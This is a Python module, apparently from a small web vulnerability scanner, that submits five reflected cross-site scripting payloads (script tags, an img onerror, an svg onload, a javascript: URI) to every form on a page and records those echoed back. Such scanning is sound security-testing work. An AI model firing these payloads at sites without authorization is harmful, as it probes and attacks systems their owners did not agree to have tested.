from .crawler import get_forms, submit_form
import requests

# A small but representative payload set
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
]

def scan_xss(url: str, session: requests.Session) -> list[dict]:
    """Test all forms on a URL for reflected XSS vulnerabilities."""
    findings = []
    forms = get_forms(url, session)

    if not forms:
        print(f"  [~] No forms found at {url}")
        return findings

    for i, form in enumerate(forms):
        for payload in XSS_PAYLOADS:
            response = submit_form(form, payload, session)
            if response and payload in response.text:
                finding = {
                    "type": "XSS",
                    "url": url,
                    "form_action": form["action"],
                    "method": form["method"],
                    "payload": payload,
                }
                findings.append(finding)
                print(f"  [!] XSS FOUND at {form['action']} — payload: {payload}")
                break  # One confirmed hit per form is enough

    return findings